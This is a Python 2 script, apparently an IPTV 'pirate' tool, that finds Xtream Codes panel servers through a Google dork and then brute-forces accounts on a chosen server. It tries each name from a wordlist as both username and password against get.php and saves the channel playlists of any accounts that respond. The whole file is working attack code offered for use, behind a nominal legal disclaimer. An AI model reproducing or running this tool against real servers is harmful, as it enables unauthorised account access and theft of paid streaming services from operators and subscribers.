#!/usr/bin/python
#-*- coding: utf-8 -*-

#########################################################################
#  This program is free software; you can redistribute it and/or modify #
#  it under the terms of the GNU General Public License as published by #
#  the Free Software Foundation; either version 2 of the License, or    #
#  (at your option) any later version.                                  #
#                                                                       #
#  This program is distributed in the hope that it will be useful,      #
#  but WITHOUT ANY WARRANTY; without even the implied warranty of       #
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #
#  GNU General Public License for more details.                         #
#                                                                       #
#  You should have received a copy of the GNU General Public License    #
#  along with this program; if not, write to the Free Software          #
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,           #
#  MA 02110-1301, USA.                                                  #
############################# DISCALIMER ################################
#  Usage of this software for probing/attacking targets without prior   #
#  mutual consent, is illegal. It's the end user's responsability to    #
#  obey alla applicable local laws. Developers assume no liability and  #
#  are not responible for any missue or damage caused by thi program    #
#########################################################################

#by Pinperepette - The Pirate

import urllib2, google, time, pyprind , sys, os
from urlparse import urlparse
from sys import argv as s

#parametri editabili
search = "Xtream Codes v1.0.59.5"
names = "names.txt"


def print_link():
    for url in google.search(search, num = 30, stop = 1):
        parsed = urlparse(url)
        print(parsed.scheme + "://" + parsed.netloc + "\n")


def search_account(URL):
    rows = open(names , "r")
    NR = len(rows.readlines())
    TT = (str(NR))
    n = NR
    bar = pyprind.ProgBar(n, title = " ", stream = 1, monitor = True)
    tr = 0
    with open(names) as f:
        content = f.readlines()
    for r in content:
        req = urllib2.Request( URL + "/get.php?username=%s&password=%s&type=m3u&output=mpegts" % (r.rstrip().lstrip(), r.rstrip().lstrip()))
        response = urllib2.urlopen(req)
        the_page = response.read()
        NR = (NR - 1)
        TM = (str(NR))
        bar.update()
        if len(the_page) > 0:
            tr = (tr + 1)
            out_file = open("m3u/tv_channels_%s.m3u" % r.rstrip().lstrip(), "w")
            out_file.write(the_page)
            out_file.close()
    trov = (str(tr))
    print ("Accounts found: " + trov)

def usage():

    print "##### IPTV"
    print "##### Basic Usage"
    print ("Print the servers list: " + s[0] + " " + "-pl")
    print ("Account search: " + s[0] + " " + "http://site.server")

if len(s) == 1:
    usage()
    exit()
if s[1] == "-h":
    usage()
    exit()
if s[1] == "-pl":
    print_link()
    exit()

search_account(s[1])
